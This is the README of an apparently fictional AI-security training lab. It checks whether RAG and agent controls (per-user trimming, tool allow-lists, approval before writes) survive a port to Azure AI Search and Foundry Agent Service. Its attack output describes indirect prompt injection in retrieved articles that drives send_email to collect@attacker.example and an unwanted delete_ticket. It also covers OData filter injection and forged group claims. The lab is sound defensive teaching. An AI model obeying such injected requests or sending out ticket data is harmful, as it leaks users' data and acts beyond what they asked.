# Lab AZ13: port the TSG Helpdesk RAG + agent to Azure AI Search, Foundry IQ and Foundry Agent Service without losing a single control

Companion to lessons **13.0 to 13.3** of *AI Security Engineer* (The Sec Guy), Azure stream. About 45 minutes,
**$0**, all on your laptop. **Nothing to install** (Python standard library only) and **no Azure subscription
needed**. An optional guided build ([GUIDED-BUILD.md](GUIDED-BUILD.md)) makes the real thing in your own
subscription: a Free-tier search index with per-user permissions, a Foundry IQ knowledge base and a prompt agent.

You are still the cloud security engineer at **Contoso** (fictional; "Contoso" is the placeholder name Microsoft uses
in its documentation). In Modules 6 and 7 you built the Helpdesk's local RAG and agent controls: per-tenant
retrieval, spotlighting, a tool allow-list, approval before writes. Contoso has now "ported" the Helpdesk to Azure.
Your job: check that every one of those controls made it across, and prove it.

| Part | What you do | Lesson |
|---|---|---|
| **Check** | `make check`: 19 rules over the search service, index, agent, connections, roles and app | 13.1, 13.2 |
| **Break** | `make attack`: 9 attacks and 5 legitimate requests against version 1 | 13.1, 13.2 |
| **Compare** | `make compare`: version 1, "v1.1" (the obvious fixes only) and the hardened build | 13.3 |
| **Hunt** | `make hunt`: the Helpdesk's own audit log on its first day in production | 13.2 |
| **Challenge** | `make challenge`: permission resync, an approval reviewer that reads arguments, a safe filter, reconstruct() | 13.1, 13.2 |
| **Guided build** (optional) | [GUIDED-BUILD.md](GUIDED-BUILD.md): create it from zero in your subscription, portal and CLI | 13.3 |

## What's in this folder

| File | What it is |
|---|---|
| `checker.py` | 19 rules (`AZ13-01` to `AZ13-19`), each from a Microsoft Learn page |
| `attack.py` | 9 attacks (`A1`-`A9`) and 5 legitimate requests (`L1`-`L5`), three setups |
| `twin.py` | A **teaching model** of Azure AI Search trimming, a knowledge base retrieve, and the agent runtime (see below) |
| `stand_in_model.py` | The "model": plain Python, obeys any lab placeholder it reads (the worst case) |
| `hunt.py` | Three hunting rules over the audit log; `reconstruct()` is challenge 4 |
| `sync_check.py`, `review_policy.py`, `safe_filter.py` | Challenges 1, 2 and 3 (stubs) |
| `contoso/` | Version 1: `search.json` (service, index, knowledge base), `agent.json` (agent, connections, guardrail), `app.json` (helpdesk-web), `roles.json` |
| `fixes/` | The hardened build, same files |
| `data/directory.json` | Fictional Entra users (alice = HR, bob and dana = helpdesk), groups, Purview label rights, two tickets |
| `data/source-docs.json` | Seven fictional documents with their ACLs, ACL history, labels and chunks |
| `logs/helpdesk-audit.jsonl` | A **fake** audit log for 19 October 2026: 111 retrieve, approval and tool_call events |
| `cloud/` | `cloud.sh` + `build.py` for the guided build |
| `test_lab.py`, `test_challenge.py`, `run_tests.py` | 18 tests for the lab, 5 for the challenge |

**About `twin.py`.** It is not Azure. It models what this lab needs, each rule from Microsoft's documentation (Oct 2026):

- **Security filters (GA)** are string matching: "The principal is just a string, used in a filter expression"
  ([security filters](https://learn.microsoft.com/en-us/azure/search/search-security-trimming-for-azure-search)).
  `search.in` splits its list on spaces and commas.
- **Native trimming (preview)**: `permissionFilter` fields `userIds`/`groupIds`, the special value `"all"`, and "a
  document is considered authorized if any filter succeeds"; a direct query without the user's token returns "only
  public documents accessible to everyone"
  ([query-time ACL](https://learn.microsoft.com/en-us/azure/search/search-query-access-control-rbac-enforcement)).
- **Knowledge base retrieve**: for indexed sources the engine "returns unfiltered results" if the user's identity is
  omitted ([retrieve](https://learn.microsoft.com/en-us/azure/search/agentic-retrieval-how-to-retrieve)).
- **Purview labels (preview)**: a row is dropped if the user can't extract its label; unlabelled chunk rows pass
  ("Without this projection, chunk-level references aren't filtered",
  [document-level access](https://learn.microsoft.com/en-us/azure/search/search-document-level-access-overview)).
- **Permission sync**: the index holds the ACL as of the last sync; changes appear only after the next one.
- **MCP tool**: `allowed_tools` omitted = "all of the tools in the MCP server"; `require_approval` values `always`,
  `never`, `{"never": [...]}`, `{"always": [...]}`, default `always`; approval goes through an
  `mcp_approval_request` item ([MCP tool](https://learn.microsoft.com/en-us/azure/foundry/agents/how-to/tools/model-context-protocol)).
- **Guardrails**: tool-response checks run only for tools with moderation support, and MCP isn't on Microsoft's list
  ([intervention points](https://learn.microsoft.com/en-us/azure/foundry/guardrails/intervention-points)).
- **Identity**: a shared credential acts for every user; OAuth identity passthrough acts as the user
  ([MCP authentication](https://learn.microsoft.com/en-us/azure/foundry/agents/how-to/mcp-authentication)).

It does not model ranking quality (retrieval is keyword overlap, not semantic ranking), Microsoft Graph group
expansion, token lifetimes, Azure's exact error bodies, or what a real model would do with an injected line. The JSON
in `contoso/` and `fixes/` uses Microsoft's property names where they exist (`permissionFilterOption`,
`purviewEnabled`, `require_approval`, `allowed_tools`, `project_connection_id`...) inside a lab-shaped wrapper; the
`_about` field in each file says which parts are lab shorthand.

**About the data and safety.** Object IDs are the example GUIDs Microsoft uses in its push-API page. Every injected
line is a labelled `[LAB-PLACEHOLDER TOOL REQUEST ...]`, not a working payload; the stand-in model reacts to the marker.
Outside addresses use the reserved `.example` domain. Nothing here contacts Azure. Test 18 checks all of that.

## Step 1 · Review before anyone attacks (`make check`)

```text
$ make check            (first lines and the total)
[HIGH  ] AZ13-01 search srch-helpdesk-contoso
          API keys are accepted (authOptions set, disableLocalAuth false). Key-based authentication is the default and a key carries no user: every caller with it is everyone. Use role-based access only.
[HIGH  ] AZ13-05 index helpdesk-kb
          4 source documents have restricted ACLs, but permissionFilterOption is not 'enabled': no native query-time trimming. Anything that can query the index sees everything.
[HIGH  ] AZ13-07 index helpdesk-kb
          Purview labels are on parent rows only. Microsoft: "Without this projection, chunk-level references aren't filtered." Project sensitivityLabel to every chunk.
...
19 findings in contoso/: 8 HIGH, 7 MEDIUM, 4 LOW
```

Read the eight HIGH findings first. Each one is a control from Modules 6 and 7 that didn't survive the move: per-user
retrieval (AZ13-05, 11, 12, 18), chunk-level metadata (07), approval before writes (14), and the identity tools act
as (15). Lesson 13.1 covers the search half, 13.2 the agent half.

## Step 2 · Break version 1 (`make attack`)

```text
$ make attack           (excerpt)
!! ATTACK WORKED A2 helpdesk-web trusts the groups in the request body
       bob claimed groups helpdesk-staff, hr and got ['HR-7003#0']
       note: $filter = group_ids/any(g: search.in(g, 'helpdesk-staff, hr'))
!! ATTACK WORKED A4 Knowledge base called without the user's token
       bob got ['HR-7003#0']
       note: knowledge_base_retrieve called WITHOUT x-ms-query-source-authorization: results unfiltered
!! ATTACK WORKED A7 Indirect injection in a retrieved article asks for send_email to an outside address
       send_email(to=collect@attacker.example, subject=kb, body=open-tickets) done as svc-helpdesk-admin
       note: knowledge_base_retrieve called WITHOUT x-ms-query-source-authorization: results unfiltered
       note: guardrail did not scan the retrieved content (no tool-response control)
!! ATTACK WORKED A9 Bob asks the agent to close Priya's ticket: the actions server sees an admin token
       close_ticket 4480 done as svc-helpdesk-admin
...
[contoso] Attacks that worked: 9 of 9 · legitimate requests that failed: 0 of 5
```

Nothing failed for real users. That is why ports like this ship: every demo works.

## Step 3 · Compare three setups (`make compare`)

`v1.1` is what most teams do after the first review: switch on native trimming, forward the user's token to the
knowledge base, remove the built-in search tool. It is a real improvement, and it still leaves six attacks.

```text
$ make compare
         contoso    v1.1   fixes
A1             X       .       .   Cross-user leak through the agent's built-in Azure AI Search
A2             X       .       .   helpdesk-web trusts the groups in the request body
A3             X       X       .   Filter injection through the 'department' box on helpdesk-we
A4             X       .       .   Knowledge base called without the user's token
A5             X       X       .   Purview label on the parent row only: chunk 2 is unlabelled
A6             X       X       X   Permission removed at 09:00, index synced at 08:00
A7             X       X       X   Indirect injection in a retrieved article asks for send_emai
A8             X       X       .   Injected article asks for delete_ticket, a tool nobody meant
A9             X       X       .   Bob asks the agent to close Priya's ticket: the actions serv
L1            ok      ok      ok   Bob: how do I reset my VPN password?
L2            ok      ok      ok   Bob: who approves hardware refunds?
L3            ok      ok      ok   Alice (HR): what are the 2027 pay bands for L4?
L4            ok      ok      ok   Bob: email me the VPN steps (bob@contoso.com)
L5            ok      ok      ok   Bob: open a ticket for my broken dock
worked       9/9     6/9     2/9
X = attack worked, . = blocked. An X left under 'fixes' is a challenge (A6: challenge 1, A7: challenge 2).
```

What the hardened build (`fixes/`) changes, and the Module 6/7 control each change carries across:

| Change in `fixes/` | Local control it replaces | Stops |
|---|---|---|
| `permissionFilterOption: enabled`, `UserIds`/`GroupIds` on every chunk | M6 per-tenant retrieval filter | A1, A2 |
| Knowledge base tool forwards `x-ms-query-source-authorization` from a structured input | M6 "filter by the caller, not by the prompt" | A4 |
| `sensitivityLabel` projected to every chunk | M6 chunk-level metadata | A5 |
| helpdesk-web takes groups only from the validated token, and forwards the token too | M6 server-side scoping | A2, A3 |
| `allowed_tools` on the actions server | M7 tool allow-list | A8 |
| `require_approval: {"never": ["search_tickets"]}` (everything else asks) | M7 approval before writes | A7 (with challenge 2) |
| OAuth identity passthrough on the actions connection | M7/M8 least privilege, no shared admin token | A9 |
| Keys off, private endpoint, CMK, logs, Search Index Data Reader for the project | M11 resource hardening | (`make check`) |

Two attacks are left on purpose. **A6**: the index still serves the 08:00 permissions at 10:00. **A7**: approval is
on, but the stand-in reviewer approves anything that looks like a tool name it knows, which is what a person does on
their fortieth request. Notice also the checker's one **note** on the hardened build: the agent's guardrail has an
Indirect attack control on tool responses, but every tool is now MCP, which isn't on Microsoft's list of tools with
moderation support. Moving retrieval to the knowledge base (an MCP tool) quietly removed that layer; the deterministic
controls have to carry it.

## Step 4 · Hunt in the audit log (`make hunt`)

```text
$ make hunt
111 events, 2026-10-19T08:02:12Z to 2026-10-19T10:24:53Z

H1 retrieves without the user's token: 3
   2026-10-19T08:19:39Z helpdesk-agent v3 user=bob docs=['HR-7003#0', 'KB-2040#0']
   2026-10-19T09:22:00Z helpdesk-agent v3 user=bob docs=['HR-7003#0', 'KB-2040#0']
   2026-10-19T10:06:20Z helpdesk-agent v3 user=bob docs=['HR-7003#0', 'KB-2040#0']

H2 approvers clicking 'approve' in under 1500 ms, 5+ times: {'dana': 14}

H3 approved emails outside contoso.com: 1
   2026-10-19T09:56:24Z turn-0044 user=bob to=collect@attacker.example

H4 write calls whose arguments came from a retrieved chunk: not implemented yet (challenge 4)
```

Three stories: an old agent **version** (v3) without the header is still reachable and returns HR content (H1);
someone approves faster than they can read (H2); an outside email was approved (H3). H4 is yours: prove which
document put that address into the call.

## Step 5 · Prove it (`make test`)

```text
$ make test             (last lines)
[PASS] 16 a shared admin credential closes anyone's ticket; the user's own identity can't
[PASS] 17 hunt: 3 token-less retrieves, dana rubber-stamps 14 approvals, 1 email outside contoso.com
[PASS] 18 safety: injected lines are labelled placeholders, addresses are reserved test domains, no secrets
----------------------------------------------------------------------
Ran 18 tests in 0.060s

OK

ALL TESTS PASSED (18 run)
```

## Step 6 · Challenge (`make challenge`)

```text
$ make challenge        (last lines, before you start)
  why test_c4_reconstruct: AssertionError: reconstruct() returned []
  why test_c5_overall: AssertionError: 2 of 9 attacks still work, 0 of 5 legitimate requests fail
----------------------------------------------------------------------
Ran 23 tests in 0.046s

FAILED (failures=5)

5 of 23 TESTS FAILED (23 run)
```

1. **`sync_check.py`**: `stale_documents()` returns every document whose ACL changed after the last sync, so the
   hardened build re-syncs them (A6). In Azure that is `/resync` with `{"options": ["permissions"]}` or
   `/resetdocs` (both preview).
2. **`review_policy.py`**: `approve()` reads the arguments: recipients only at contoso.com, only known tools (A7).
   Notice what the approval request does not tell you: who asked, or why.
3. **`safe_filter.py`**: `build_filter()` accepts only known group names with no delimiters, and escapes quotes in
   user input the OData way (`'` becomes `''`).
4. **`hunt.py`**: `reconstruct()` matches each write call's argument values to the chunks retrieved in the same turn.

Done when `make challenge` shows `ALL TESTS PASSED (23 run)` and `make compare` shows `0/9` under `fixes`.
No solution is included.

## Step 7 · The guided build (optional, your subscription)

[GUIDED-BUILD.md](GUIDED-BUILD.md) builds the same design for real, from zero, with portal clicks and CLI: a Free
Azure AI Search service with keys off, an index with `permissionFilterOption` and two Entra groups, a Foundry IQ
knowledge base, and a prompt agent with the knowledge base MCP tool (user token forwarded) and a `send_email`
function your code confirms. Five requests (normal, cross-user leak, injected document, write needing confirmation,
a tool it was never given), one setting changed (the token header removed), cost and teardown. Cost: Search Free is
$0; model tokens are a few US cents.

## Windows

No `make`? Run the Python lines from the Makefile, for example `python checker.py`, `python attack.py --compare`,
`python run_tests.py --challenge`. The guided build's `cloud.sh` needs Git Bash or WSL; every command in it is also
shown in GUIDED-BUILD.md.
